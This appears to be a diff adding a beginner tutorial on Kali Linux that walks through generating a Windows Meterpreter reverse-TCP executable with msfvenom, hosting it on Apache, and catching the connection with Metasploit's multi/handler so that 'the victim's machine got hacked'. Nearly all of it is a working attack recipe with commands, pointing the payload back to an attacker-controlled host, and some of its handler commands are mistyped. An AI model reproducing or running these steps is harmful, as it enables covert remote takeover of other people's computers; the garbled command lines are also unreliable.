@@ -1,0 +1,50 @@
+Firstly we need to create a payload which uses reverse TCP connection and we have to declare the type of OS on which this payload is going to work and we also have to define the type of payload to be created,
+like for windows the extension of the file will be .exe and for android it will be .apk
+
+note - All this should be done in kali linux terminal
+
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.203.132 LPORT=4564 --format=exe > practice.exe
+ 
+here we have declared the local host IP as well as  local port for the payload to enter the victim's system.
+
+
+
+now in new terminal we have to start our apache server, on which we upload our payload
+we can check the status of apache server by using -
+service apache2 status                                                                           
+if the server is not running then we can start the server by using- 
+service apache2 start
+
+
+our payload and server is ready.
+
+now to exploit our payload we use msfconsole which contains exploit multi handler
+we can launch the msf console by using the command 
+
+msfconsole 
+
+note- launch this in new terminal
+
+in msfconsole use exploit/multi/handler
+
+set the payload,lhsot,lport in msfconsole by using the following commands-
+
+set-p windows/meterpreter/reverse_tcp
+set LPORT = 4564
+set LHOST = 192.168.203.132
+
+after setting up all things exploit the payload by using -
+exploit
+
+
+now download the file in the victim's machine 
+as soon as the victim download the payload, the victim's machine got hacked and we get full access of the machine.
+
+
+
+
+
+
+
+
+
